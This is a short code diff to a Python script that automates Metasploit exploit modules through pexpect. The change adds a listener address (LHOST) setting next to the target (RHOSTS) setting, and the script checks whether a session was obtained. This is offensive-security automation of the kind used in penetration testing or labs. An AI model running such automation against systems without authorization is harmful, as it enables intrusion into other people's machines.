@@ -207,7 +207,7 @@ def run_and_verify(child, commands_sent, total_timeout=60):
             return {"status": "no_session", "detail": child.before}
 
 
-def run_auto_msf(module, rhosts, timeout=120):
+def run_auto_msf(module, rhosts, lhost, timeout=120):
     # 記錄開始時間（本機時區 naive）
     start_dt = datetime.now()
     print(f"[+] start time: {start_dt.strftime('%Y-%m-%d %H:%M:%S')}")
@@ -265,6 +265,11 @@ def run_auto_msf(module, rhosts, timeout=120):
         print(f"[*] set RHOSTS = {rhosts}")
         commands_sent.append(f"set RHOSTS {rhosts}")
         child.sendline(f"set RHOSTS {rhosts}")
+        child.expect(MSF_PROMPT_RE)
+
+        print(f"[*] set LHOSTS = {lhost}")
+        commands_sent.append(f"set LHOST {lhost}")
+        child.sendline(f"set LHOST {lhost}")
         child.expect(MSF_PROMPT_RE)
 
         print("[*] show options")
